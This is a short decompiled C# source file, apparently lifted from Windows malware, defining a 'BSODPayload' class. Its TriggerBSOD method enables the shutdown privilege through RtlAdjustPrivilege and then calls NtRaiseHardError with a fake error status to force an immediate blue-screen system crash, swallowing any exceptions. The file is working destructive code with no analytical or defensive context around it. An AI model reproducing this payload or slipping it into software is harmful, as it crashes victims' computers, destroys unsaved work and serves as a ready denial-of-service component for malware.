using System;
using System.Runtime.InteropServices;

namespace ns0
{
	// Token: 0x0200000E RID: 14
	public static class BSODPayload
	{
		// Token: 0x06000009 RID: 9
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		// Token: 0x0600000A RID: 10
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		// Token: 0x0600000B RID: 11 RVA: 0x00002378 File Offset: 0x00000578
		public static void TriggerBSOD()
		{
			try
			{
				bool flag;
				BSODPayload.RtlAdjustPrivilege(19, true, false, out flag);
				uint num;
				BSODPayload.NtRaiseHardError(3735936685U, 0U, 0U, IntPtr.Zero, 6U, out num);
			}
			catch
			{
			}
		}
	}
}
